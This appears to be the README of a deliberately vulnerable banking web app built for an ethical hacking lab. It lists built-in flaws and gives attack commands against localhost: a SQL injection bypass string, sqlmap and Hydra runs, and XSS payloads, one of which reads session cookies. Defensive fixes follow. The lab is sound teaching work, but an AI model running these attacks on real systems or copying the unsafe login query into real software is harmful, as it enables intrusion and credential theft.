# AstraPay – Vulnerable Web App
### Cybersecurity Assignment – Ethical Hacking Lab
> FOR EDUCATIONAL USE ONLY. Run in an isolated lab environment.

---

## Quick Start (on Kali Linux)

### 1. Install Docker & Docker Compose
```bash
sudo apt update && sudo apt install -y docker.io docker-compose
sudo systemctl start docker
```

### 2. Clone / copy this folder to Kali, then:
```bash
cd astrapay/
sudo docker-compose up --build -d
```

### 3. Access the app
- Open browser → http://localhost:5000
- Login: `admin / admin123` or `john.doe / password`

---

## Vulnerabilities Built In

| # | Vulnerability | Location | Attack Tool |
|---|---|---|---|
| 1 | SQL Injection (Login bypass) | /login | sqlmap / manual |
| 2 | Brute Force (No rate limit) | /login | Hydra |
| 3 | Reflected XSS | /transfer?recipient= | Browser manual |
| 4 | Stored XSS | /profile (bio), /transfer (note) | Browser manual |
| 5 | Open ports, debug mode | Port 5000 | Nmap |
| 6 | Plaintext passwords in DB | PostgreSQL users table | sqlmap dump |
| 7 | Verbose DB errors exposed | /login | Manual SQLi |

---

## Attack Commands

### Nmap Reconnaissance
```bash
nmap -sV -sC -A -p 5000,5432 localhost
```

### SQL Injection – Manual Login Bypass
In the username field enter:
```
' OR '1'='1' --
```
Password: anything → bypasses authentication entirely.

### SQL Injection – SQLmap Database Dump
```bash
# First get your session cookie from browser DevTools
sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  --dbms=postgresql \
  --dbs --batch --level=3
```

### Brute Force – Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost -s 5000 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username"
```
> Unzip rockyou first: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

### Reflected XSS
Visit this URL while logged in:
```
http://localhost:5000/transfer?recipient=<script>alert('XSS - AstraPay Hacked')</script>
```

### Stored XSS (Profile Bio)
1. Go to /profile
2. In the Bio field enter:
```html
<script>alert('Stored XSS - Session: ' + document.cookie)</script>
```
3. Save → visit profile again → script executes on every load

### Stored XSS (Transaction Note)
1. Go to /transfer
2. In the Note field enter:
```html
<img src=x onerror="alert('XSS via transaction note')">
```
3. Submit → view /dashboard → payload fires in transaction table

---

## Defence Demos

### Against Brute Force – Fail2Ban
```bash
sudo apt install fail2ban -y
sudo systemctl start fail2ban
# Then re-run Hydra → gets banned after 5 attempts
```

### Against Nmap – UFW Firewall
```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw allow 5000
# Re-run Nmap → much less info returned
```

### Against SQLi – Show the fix
In app.py, change the login query to use parameterised query:
```python
# SECURE version
cur.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
Then show SQLmap returns "not injectable".

### Against XSS – Show the fix
In templates, change `{{ value | safe }}` to `{{ value }}` (Jinja2 auto-escapes by default).
Demonstrate the script tag is now rendered as plain text.

---

## Database Credentials (for report)
| Field | Value |
|---|---|
| Host | localhost |
| Port | 5432 |
| Database | astrapay |
| User | astrapay |
| Password | astrapay123 |

## Seed Users (plaintext passwords – vulnerability)
| Username | Password | Balance |
|---|---|---|
| admin | admin123 | $99,999 |
| john.doe | password | $4,250.75 |
| jane.doe | jane2024 | $1,800.50 |
| bob.smith | qwerty123 | $320.00 |
